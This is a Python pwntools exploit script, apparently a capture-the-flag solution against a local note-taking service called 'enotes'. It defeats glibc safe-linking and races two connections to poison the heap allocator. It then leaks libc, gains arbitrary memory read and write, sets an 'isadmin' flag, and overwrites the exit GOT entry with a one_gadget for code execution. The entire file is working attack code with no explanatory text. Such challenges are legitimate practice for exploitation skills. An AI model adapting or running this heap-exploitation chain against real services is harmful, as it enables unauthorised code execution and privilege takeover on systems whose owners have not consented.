from pwn import *
import os, time
context.binary = elf = ELF("enotes")
libc = ELF("./libc.so.6")
IP = "localhost"
PORT = 8003
def getkey(cipher):
    key = 0
    plain = 0

    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12

    return cipher ^ plain
def ctrlalloc(r1, r2, targ): #r1 MUST DISPOSE
    r1.clean()
    r2.clean()
    r1.sendline(b"new 1 new 2 delete 2 delete 1 new 1 read 1")
    key = getkey(u64(r1.clean()[6:][:8]))
    print("ENCRYPT KEY: 0x%x" % key)
    pay = p64(targ ^ key)
    while True:
        print("Race attempt...")
        if os.fork() == 0:
            r1.sendline(b"delete 1")
            os.kill(os.getpid(), 9)
        r2.send((b"write 1 "+pay+b"\n") * 2000)
        os.wait()
        time.sleep(0.1)
        r1.sendline(b"new 1 read 1")
        cls = r1.clean()
        if pay in cls[6:][:8]:
            break
    r1.sendline(b"new 2")
    r1.clean()

def arbwrite(r1, r2, targ, what):
    ctrlalloc(r1, r2, targ)
    r1.sendline(b"write 2 " + what)

def arbread(r1, r2, targ):
    ctrlalloc(r1, r2, targ)
    r1.sendline(b"read 2")
    return u64(r1.clean()[6:][:8])

r1 = remote(IP, PORT)
r2 = remote(IP, PORT)
r1.clean()
r2.clean()
r1.sendline(b"new 0 delete 0 new 0 read 0")
a = r1.clean()[6:][:8]
maina = u64(a) * 0x1000 + 0x8a0
print("MAIN ARENA POINTER: 0x%x" % maina)

main_arena = arbread(r1, r2, maina)
libc.address = main_arena - 0x1d2c60
print("MAIN ARENA: 0x%x" % main_arena)
print("LEAKED LIBC: 0x%x" % libc.address)

print("TOGGLING ADMIN, WRITING TO 0x%x..." % elf.sym["isadmin"])
r4 = remote(IP, PORT)
r4.clean()
arbwrite(r4, r2, elf.sym["isadmin"], p64(1))

r3 = remote(IP, PORT)
r3.clean()
one_ga = libc.address + 0xd509f
print("WRITING ONE_GADGET 0x%x to exit got (0x%x)..." % (one_ga, elf.got["exit"]))
arbwrite(r3, r2, elf.got["exit"], p64(one_ga))

print("Attack complete!")
r4.sendline(b"shutdown")